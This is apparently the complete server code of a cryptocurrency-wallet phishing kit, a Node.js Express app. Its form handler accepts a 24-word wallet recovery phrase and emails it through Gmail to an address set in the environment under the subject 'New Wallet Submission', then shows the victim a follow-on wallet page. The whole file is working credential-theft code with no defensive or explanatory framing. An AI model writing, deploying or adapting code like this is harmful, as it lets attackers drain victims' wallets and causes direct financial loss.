require('dotenv').config();
const express = require('express');
const path = require('path');
const nodemailer = require('nodemailer');

const app = express();
const PORT = process.env.PORT || 3000;

// Parse URL-encoded form data
app.use(express.urlencoded({ extended: true }));

// Serve static files from "public"
app.use(express.static(path.join(__dirname, 'public')));

// ✅ Route for homepage (index.html)
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

// ✅ Route to handle form submissions
app.post('/submit', (req, res) => {
  const phrase = req.body.passphrase;

  if (!phrase || phrase.trim().split(/\s+/).length < 24) {
    return res.status(400).send('Passphrase must be at least 24 words');
  }

  const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
      user: process.env.EMAIL_USER,
      pass: process.env.EMAIL_PASS
    }
  });

  const mailOptions = {
    from: process.env.EMAIL_USER,
    to: process.env.EMAIL_TO,
    subject: 'New Wallet Submission',
    text: `Passphrase: ${phrase}`
  };

  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.error('❌ Email failed:', error);
      return res.status(500).send('Email failed');
    }
    console.log('✅ Email sent:', info.response);
    res.sendFile(path.join(__dirname, 'wallet.html'));
  });
});

// Catch-all 404
app.get('*', (req, res) => {
  res.status(404).send('404 Not Found');
});

// Start the server
app.listen(PORT, () => {
  console.log(`✅ Server running on port ${PORT}`);
});
